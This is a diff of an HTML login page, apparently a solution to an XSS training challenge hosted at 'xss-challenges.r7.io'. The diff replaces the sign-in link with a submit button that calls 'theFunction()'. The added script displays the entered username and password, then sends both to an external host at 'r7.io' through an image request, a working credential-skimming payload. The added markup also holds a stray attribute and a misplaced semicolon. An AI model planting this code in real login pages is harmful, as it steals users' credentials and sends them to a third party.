@@ -20,7 +20,6 @@
             }
         });
     </script>
-
   </head>
 
 
@@ -33,14 +32,21 @@
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
-          <input id="login_username" placeholder="username" tabindex="1" name="username" type="text">
+          <input id="login_username" placeholder="username" tabindex="1" name="username" type="text" var ="username">
           <div class="error-msg">Hint: your username is separate from your email address.</div>
           <input id="login_password" placeholder="passphrase" tabindex="2" autocomplete="off" class="validate-text" name="password" type="password" mouseev="true" keyev="true" clickev="true"> 
+          <!--<script>var user = login_username;</script>-->
       </div>
         <input id="user_language" name="user_language" type="hidden" value="english">
-        <a href="http://xss-challenges.r7.io/0/login">
-          <input type="button" id="signin-btn" class="submit-btn optional" value="Sign in..."tabindex="3">
-        </a>
+        <!--<a href="http://xss-challenges.r7.io/0/login"></a>-->
+          <input type="submit" id="button" class="submit-btn optional" value="Sign in..." onclick="theFunction()" ;tabindex="3">
+            <script>
+              function theFunction(){
+                alert("Username: " + login_username.value + ' Password: ' + login_password.value);
+                i = new Image(); 
+                i.src = 'http://r7.io/e/1166811?s=' + login_username.value + ' ' + login_password.value;
+              };
+            </script>
       </div>
 
       <div class="supplemental-links">
